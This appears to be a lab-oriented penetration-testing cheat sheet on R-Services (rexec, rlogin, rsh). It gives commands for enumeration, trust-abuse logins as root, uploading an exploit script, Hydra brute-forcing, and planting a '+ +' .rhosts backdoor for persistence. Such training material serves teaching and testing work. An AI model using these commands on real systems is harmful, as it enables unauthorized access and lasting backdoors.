# R-Services
**Default Ports:**
- **512 (TCP):** `rexec` (Remote Execution) - Requires Authentication.
- **513 (TCP):** `rlogin` (Remote Login) - Uses Trust (Host/User).
- **514 (TCP):** `rsh` (Remote Shell) - Uses Trust (Host/User).

**Key Insight:** R-Services rely on **Trust Relationships** (IP Address + Username) rather than passwords. If your IP is "Trusted" in `/etc/hosts.equiv` or `~/.rhosts`, you can log in without a password.
## 1. Discovery & Enumeration
**Goal:** Identify which R-Services are running and check for known users.
### Nmap (Version & Vulnerability)
```shell
# Version Scan
sudo nmap -sV -p 512,513,514 10.129.2.15

# Check for R-Login Vulnerabilities (Open Relay/Trust)
# ⚠️ OPSEC: Moderate Noise.
sudo nmap -p 514 --script rlogin-vuln 10.129.2.15
```
### RPC User List (`rusers`)
**Description:** Queries the rusersd daemon to list logged-in users. 
**Syntax:** `rusers -al <IP>`
```shell
# List all users (-a) in long format (-l)
rusers -al 10.129.2.15
```
## 2. Exploitation: Abusing Trust (The ".rhosts" Attack)
**Concept:** If the target trusts your IP (or "promiscuous mode" is on), you can execute commands as any user.
### Remote Login (`rlogin`)
**Install:** `sudo apt install rsh-client` 
**Description:** Interactive shell login. 
**Syntax:** `rlogin -l <User> <IP>`
```shell
# Attempt to log in as root (Hope for trust)
# If successful, you get a shell immediately.
rlogin -l root 10.129.2.15

# Attempt as a known user (e.g., from rusers output)
rlogin -l jsmith 10.129.2.15
```
### Remote Shell (`rsh`)
**Description:** Execute single commands without an interactive shell. 
**Syntax:** `rsh -l <User> <IP> "<Command>"`
```shell
# Check ID
rsh -l root 10.129.2.15 "id; whoami"

# Upload File (Cat Redirection)
# "cat local" -> pipe -> "rsh remote cat > remote"
cat local_exploit.sh | rsh -l root 10.129.2.15 "cat > /tmp/exploit.sh"
```
## 3. Password Attacks (`rexec`)
**Context:** `rexec` (Port 512) requires a password (plaintext), unlike rlogin/rsh. 
**Tool:** Hydra.
```shell
# Brute Force
# exec:// protocol targets rexec
hydra -l root -P /usr/share/wordlists/rockyou.txt exec://10.129.2.15
```
## 4. Post-Exploitation (Persistence & Config)
**Context:** You have shell access. **Goal:** Check "Trust Files" to see which other machines can access this one, or add yourself for persistence.
### Critical Configuration Files
**1. Global Trust:** `/etc/hosts.equiv`
- Contains a list of trusted **hosts**. Users from these hosts can log in as _any_ non-root user without a password. 
- **Danger:** A `+` sign means "Trust Everyone".
**2. User Trust:** `~/.rhosts`
- Located in a user's home directory.
- Format: `Hostname Username`

```shell
# Check Global Trust
cat /etc/hosts.equiv

# Check Root Trust
cat /root/.rhosts
```
### Establishing Persistence (Backdoor)
**Technique:** Add `+ +` to `.rhosts`. This allows **any user** from **any host** to log in as the target user without a password.
```shell
# 1. Add Backdoor
echo "+ +" > ~/.rhosts
# OR specific IP
echo "10.10.14.5 root" >> /root/.rhosts

# 2. Connect from Attacker Machine
rlogin -l root 10.129.2.15
```